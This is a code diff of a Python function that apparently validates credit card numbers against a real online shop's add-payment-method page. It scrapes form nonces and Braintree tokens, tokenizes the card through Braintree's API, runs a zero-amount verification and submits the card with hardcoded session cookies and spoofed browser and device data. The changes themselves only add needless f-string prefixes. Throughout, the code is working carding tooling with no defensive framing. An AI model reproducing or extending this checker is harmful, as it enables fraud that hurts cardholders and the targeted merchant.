@@ -55,7 +55,7 @@ def Tele(ccx):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	res1 = requests.get('https://husbands-paris.com/en/my-account/add-payment-method/', cookies=cookies, headers=headers)
+	res1 = requests.get(f'https://husbands-paris.com/en/my-account/add-payment-method/', cookies=cookies, headers=headers)
 	r4 = res1.text
 	anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r4).group(1)
 	T = capture(r4,'wc_braintree_client_token = ["','"]')
@@ -106,7 +106,7 @@ def Tele(ccx):
         'operationName': 'TokenizeCreditCard',
     }
 
-	res2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+	res2 = requests.post(f'https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
 	token = res2.json()['data']['tokenizeCreditCard']['token']
 
 
@@ -129,7 +129,7 @@ def Tele(ccx):
 }
 
 	json_data = {
-    'amount': '0.00',
+    f'amount': '0.00',
     'browserColorDepth': 24,
     'browserJavaEnabled': False,
     'browserJavascriptEnabled': True,
@@ -211,7 +211,7 @@ def Tele(ccx):
 }
 
 	data = {
-    'payment_method': 'braintree_cc',
+    f'payment_method': 'braintree_cc',
     'braintree_cc_nonce_key': nonce,
     'braintree_cc_device_data': '{"device_session_id":"e36d6eeea156c6963bc507e94e9c8757","fraud_merchant_id":null,"correlation_id":"2456c41dce56a08cf5bc1425a4924b3e"}',
     'braintree_cc_3ds_nonce_key': '',
@@ -222,7 +222,7 @@ def Tele(ccx):
 }
 
 	response = requests.post(
-    'https://husbands-paris.com/en/my-account/add-payment-method/',
+    f'https://husbands-paris.com/en/my-account/add-payment-method/',
     cookies=cookies,
     headers=headers,
     data=data,
